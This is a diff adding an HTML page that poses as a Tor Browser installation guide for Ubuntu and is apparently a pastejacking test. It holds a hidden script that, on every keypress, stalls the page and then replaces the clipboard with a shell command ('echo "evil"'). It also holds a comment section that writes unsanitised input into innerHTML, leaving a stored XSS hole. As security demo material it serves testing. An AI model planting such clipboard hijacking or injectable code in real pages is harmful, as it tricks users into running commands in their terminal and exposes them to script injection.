@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Guide to installing Tor Browser on Ubuntu">
+    <title>How to Install Tor Browser in Ubuntu</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <!-- Header Section -->
+    <header>
+        <div class="container">
+	    <h1>test 2  Pastejacking </h1>
+            <h1>How to Install Tor Browser in Ubuntu</h1>
+            <p>by Mohamed Shahat</p>
+        </div>
+    </header>
+
+    <!-- Content Section -->
+    <div class="container">
+        <article>
+            <section>
+                <h2>Introduction</h2>
+                <p>Tor Browser allows you to browse the internet anonymously, ensuring your privacy and security. This guide will walk you through installing Tor Browser on Ubuntu.</p>
+            </section>
+
+            <section>
+                <h2>Step 1: Update Your System</h2>
+                <p>First, ensure your system is up to date. Open a terminal and run the following commands:</p>
+                <pre><code>sudo apt update && sudo apt upgrade</code></pre>
+            </section>
+
+            <section>
+                <h2>Step 2: Add Tor Repository</h2>
+                <p>Next, you need to add the official Tor repository to your system by running the following:</p>
+                <pre><code>sudo add-apt-repository ppa:torproject/torbrowser</code></pre>
+            </section>
+
+            <section>
+                <h2>Step 3: Install Tor Browser</h2>
+                <p>After adding the repository, you can install Tor Browser:</p>
+                <pre><code>sudo apt install torbrowser-launcher</code></pre>
+            </section>
+
+            <section>
+                <h2>Step 4: Launch Tor Browser</h2>
+                <p>Once the installation is complete, you can launch Tor Browser from your application menu, or run the following command:</p>
+                <pre><code>torbrowser-launcher</code></pre>
+            </section>
+
+            <section>
+                <h2>Conclusion</h2>
+                <p>That’s it! You have successfully installed Tor Browser on your Ubuntu machine. Enjoy safe and anonymous browsing!</p>
+            </section>
+        </article>
+
+        <!-- Vulnerable Comment Section -->
+        <section id="comments">
+            <h2>User Comments</h2>
+            <form action="#" method="POST" id="commentForm">
+                <label for="username">Name:</label>
+                <input type="text" id="username" name="username" required>
+                
+                <label for="comment">Comment:</label>
+                <textarea id="comment" name="comment" required></textarea>
+                
+                <button type="submit">Submit</button>
+            </form>
+
+            <!-- Displaying Comments without sanitization -->
+            <div id="commentSection">
+                <h3>Previous Comments:</h3>
+                <div id="commentsList"></div>
+            </div>
+        </section>
+    </div>
+
+    <script>
+        const form = document.getElementById('commentForm');
+        const commentsList = document.getElementById('commentsList');
+
+        // Function to load comments from local storage
+        function loadComments() {
+            const comments = JSON.parse(localStorage.getItem('comments')) || [];
+            commentsList.innerHTML = comments.map(comment => 
+                `<p><strong>${comment.username}:</strong> ${comment.comment}</p>`
+            ).join('');
+        }
+
+        // Load comments when the page loads
+        window.onload = loadComments;
+
+        form.onsubmit = function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const comment = document.getElementById('comment').value;
+
+            // Create a new comment object
+            const newComment = { username, comment };
+
+            // Retrieve existing comments from local storage
+            const comments = JSON.parse(localStorage.getItem('comments')) || [];
+
+            // Add the new comment to the list
+            comments.push(newComment);
+
+            // Save the updated list back to local storage
+            localStorage.setItem('comments', JSON.stringify(comments));
+
+            // Update the comments list on the page
+            commentsList.innerHTML += `<p><strong>${username}:</strong> ${comment}</p>`;
+
+            // Clear the form fields
+            form.reset();
+        };
+    </script>
+
+    <!-- Footer Section -->
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 Your Name. All rights reserved.</p>
+        </div>
+    </footer>
+ <script>
+            function copyTextToClipboard(text) {
+              var textArea = document.createElement("textarea");
+
+              //
+              // *** This styling is an extra step which is likely not required. ***
+              //
+              // Why is it here? To ensure:
+              // 1. the element is able to have focus and selection.
+              // 2. if element was to flash render it has minimal visual impact.
+              // 3. less flakyness with selection and copying which **might** occur if
+              //    the textarea element is not visible.
+              //
+              // The likelihood is the element won't even render, not even a flash,
+              // so some of these are just precautions. However in IE the element
+              // is visible whilst the popup box asking the user for permission for
+              // the web page to copy to the clipboard.
+              //
+
+              // Place in top-left corner of screen regardless of scroll position.
+              textArea.style.position = 'fixed';
+              textArea.style.top = 0;
+              textArea.style.left = 0;
+
+              // Ensure it has a small width and height. Setting to 1px / 1em
+              // doesn't work as this gives a negative w/h on some browsers.
+              textArea.style.width = '2em';
+              textArea.style.height = '2em';
+
+              // We don't need padding, reducing the size if it does flash render.
+              textArea.style.padding = 0;
+
+              // Clean up any borders.
+              textArea.style.border = 'none';
+              textArea.style.outline = 'none';
+              textArea.style.boxShadow = 'none';
+
+              // Avoid flash of white box if rendered for any reason.
+              textArea.style.background = 'transparent';
+
+
+              textArea.value = text;
+
+              document.body.appendChild(textArea);
+
+              textArea.select();
+
+              try {
+                var successful = document.execCommand('copy');
+                var msg = successful ? 'successful' : 'unsuccessful';
+                console.log('Copying text command was ' + msg);
+              } catch (err) {
+                console.log('Oops, unable to copy');
+              }
+
+              document.body.removeChild(textArea);
+            }
+
+            document.addEventListener('keydown', function(event) {
+                var ms = 800;  
+                var start = new Date().getTime();
+                var end = start;
+                while(end < start + ms) {
+                    end = new Date().getTime();
+                } 
+                copyTextToClipboard('echo "evil"\n');
+            });
+
+        </script>
+</body>
+</html>
